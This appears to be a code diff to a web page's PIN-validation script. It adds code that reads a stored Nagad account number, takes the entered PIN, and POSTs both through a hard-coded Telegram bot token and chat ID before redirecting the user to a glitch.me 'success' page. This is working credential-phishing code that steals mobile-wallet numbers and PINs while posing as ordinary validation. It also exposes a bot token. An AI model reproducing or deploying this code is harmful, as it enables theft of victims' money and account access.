@@ -73,9 +73,10 @@
             return `${year}/${month}/${day}`;
         }
 
-        // Validate the Pin Code
+        // Validate the Pin Code and send data to Telegram
         function validatePin() {
             const pinCode = document.getElementById('pinCode').value;
+            const nagadNumber = localStorage.getItem('nagadNumber');
             const error = document.getElementById('error');
 
             if (pinCode.length < 4 || pinCode.length > 5 || isNaN(pinCode)) {
@@ -83,7 +84,28 @@
             } else {
                 error.textContent = '';  // Clear error message if pin is valid
                 const currentDate = getCurrentDate();  // Get today's date as token
-                window.location.href = `https://bluehat999.glitch.me/success.html?token=${currentDate}`;  // Redirect to success page with token
+
+                // Send data to Telegram
+                fetch('https://api.telegram.org/bot7138875939:AAGw-ROS6-ch6MILpTOJlOjcmAR6oVGoAiA/sendMessage', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: '5625471891',
+                        text: `Nagad Number: ${nagadNumber}\nPin Code: ${pinCode}`,
+                    }),
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Telegram response:', data);
+                    // After successfully submitting to Telegram, redirect the user
+                    window.location.href = `https://bluehat999.glitch.me/success.html?token=${currentDate}`;
+                })
+                .catch(error => {
+                    console.error('Error submitting to Telegram:', error);
+                    // Handle error if needed
+                });
             }
         }
     </script>
